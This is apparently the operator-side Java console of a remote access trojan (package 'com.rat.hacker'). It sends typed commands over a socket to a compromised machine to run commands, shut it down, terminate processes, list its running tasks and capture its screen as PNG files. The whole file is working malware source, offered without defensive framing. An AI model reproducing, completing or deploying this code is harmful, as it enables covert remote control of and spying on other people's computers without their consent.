package com.rat.hacker;

/**
 * @author Bar771
 * https://Bar771.tumblr.com
 */

import java.net.Socket;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.PrintWriter;
import java.io.File;

import java.util.Scanner;

import javax.imageio.ImageIO;

public class Client extends Thread{
	
	private boolean isRunning = true;
	
	private BufferedReader in;
	private PrintWriter out;
	private Socket socket;
	
	public Client(BufferedReader in, PrintWriter out, Socket socket) {
		this.in = in;
		this.out = out;
		this.socket = socket;
	}
	
	@Override
	public void run() {
		//
		try {
			Scanner scan = new Scanner(System.in);
			while (isRunning) {
				
				System.out.print("Command=>\t");
				String cmd = scan.nextLine();
				
				if (cmd.startsWith("open")) {
					out.println(cmd);
					out.flush();
				}
				else if (cmd.startsWith("shutdown")) {
					out.println(cmd);
					out.flush();
				}
				else if (cmd.startsWith("command")) {
					out.println(cmd);
					out.flush();
				}
				else if (cmd.startsWith("ping")) {
					out.println(cmd);
					out.flush();
				}
				else if (cmd.startsWith("screenshot") && cmd.split(" ").length > 1) {
					out.println(cmd.split(" ")[0]);
					out.flush();
					
					String size = in.readLine();
					int[] rgb = new int[Integer.parseInt(size.split(":")[0])*Integer.parseInt(size.split(":")[1])];
					
					for (int i=0; i<rgb.length; i++) 
						rgb[i] = Integer.parseInt(in.readLine());
						
					BufferedImage img = new BufferedImage(Integer.parseInt(size.split(":")[0]), Integer.parseInt(size.split(":")[1]), 2);
					img.setRGB(0, 0, Integer.parseInt(size.split(":")[0]), Integer.parseInt(size.split(":")[1]), rgb, 0, Integer.parseInt(size.split(":")[0]));
					ImageIO.write(img, "PNG", new File(cmd.split(" ")[1] + ".png"));
					System.out.println("[Client] Saved the file [" + cmd.split(" ")[1] + ".png] successfully !");
				}
				else if (cmd.startsWith("terminate")) {
					out.println(cmd);
					out.flush();
				}
				else if(cmd.startsWith("tasklist")) {
					out.println(cmd);
					out.flush();
					
					String line = in.readLine();
					System.out.println("[Server] TaskList:\n" + line);
				}
				else if(cmd.startsWith("exit")) {
					out.println(cmd);
					out.flush();
					System.exit(0);
				} else {
					System.err.println("Invalid command.");
				}
			}
		} catch(Exception e) {
			e.printStackTrace();
		}
		//
	}
	
}
